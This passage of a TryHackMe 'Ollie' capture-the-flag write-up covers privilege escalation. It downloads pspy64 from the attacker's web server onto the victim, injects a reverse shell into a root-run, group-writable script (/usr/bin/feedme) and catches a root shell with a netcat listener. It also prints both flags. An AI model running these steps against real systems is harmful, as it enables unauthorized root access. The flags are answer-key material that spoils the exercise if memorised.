+ollie@hackerdog:~$</code></pre><p id="28f2f0e8-c101-4595-bfc0-f67a2a0ce7a6" class="">ANSWER : THM{Ollie_boi_is_daH_Cut3st}</p><h2 id="5fa2906b-dfb7-4769-83a0-ac1915b1f9b0" class="">What is the root.txt flag?</h2><ul id="ed683532-6dc6-4f35-a69b-c0f8fa0cca65" class="bulleted-list"><li style="list-style-type:disc">sudo -l is not working so I will import  a pspy64 to find what is running in the root </li></ul><ul id="b1ee44b4-ce4d-47bd-95b6-25f762ba2e79" class="bulleted-list"><li style="list-style-type:disc">So how to use pspy64? in my host terminal we will use python server in my desktop </li></ul><pre id="9c5df8c2-6d3c-4b4d-854c-44e3ad26c73f" class="code code-wrap"><code>&quot;attacker shell&quot;
+python3 -m http.server
+
+&quot;victim shell&quot;
+wget http://10.4.26.128:8000/pspy64
+chmod +x pspy64
+./pspy64</code></pre><figure id="2713b5c1-f86b-43f0-b2ac-34c0433c7ef8" class="image"><a href="../Ollie%2024be7a424ed84cd39fafe93639a0a217/Untitled%207.png"><img style="width:989px" src="../Ollie%2024be7a424ed84cd39fafe93639a0a217/Untitled%207.png"/></a></figure><ul id="7aaa6af0-10c7-4f2c-8a31-10f374fa607d" class="bulleted-list"><li style="list-style-type:disc">I see this always running </li></ul><pre id="c33cb9a4-4455-46fb-adef-2d3493321098" class="code code-wrap"><code>ollie@hackerdog:/$ find / -name feedme 2&gt;dev/null
+/usr/bin/feedme
+ollie@hackerdog:/$ ls -la /usr/bin/feedme
+-rwxrw-r-- 1 root ollie 30 Feb 12  2022 /usr/bin/feedme
+ollie@hackerdog:/$ cat /usr/bin/feedme
+#!/bin/bash
+
+# This is weird?</code></pre><ul id="27ee4c60-2eb1-44e7-9edb-71369652ecb9" class="bulleted-list"><li style="list-style-type:disc">I’ll go inside the code and display a reverse shell in bash</li></ul><figure id="6be3b114-4bbd-440e-b5bf-a33f03d973ad" class="image"><a href="../Ollie%2024be7a424ed84cd39fafe93639a0a217/Untitled%208.png"><img style="width:758px" src="../Ollie%2024be7a424ed84cd39fafe93639a0a217/Untitled%208.png"/></a></figure><p id="2cf9a655-af9f-4661-8a44-e87e8dae83ad" class="">in the nano paste it there and after that create a netcat listener</p><pre id="3eddd737-f5c8-489e-8105-a1c70c981175" class="code code-wrap"><code>┌─[✗]─[drew@parrot]─[~/Desktop]
+└──╼ $nc -lvnp 9002
+listening on [any] 9002 ...
+connect to [10.4.26.128] from (UNKNOWN) [10.10.58.199] 32978
+sh: 0: can&#x27;t access tty; job control turned off
+# whoami
+root
+# cat /root/root.txt
+THM{Ollie_Luvs_Chicken_Fries}
+#</code></pre><p id="da1a542b-ebf5-4ff4-92e6-5fd4fb443492" class="">ANSWER : THM{Ollie_Luvs_Chicken_Fries}</p><p id="09c43a85-6992-4e66-ad8f-e196d4358d18" class="">
+</p></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
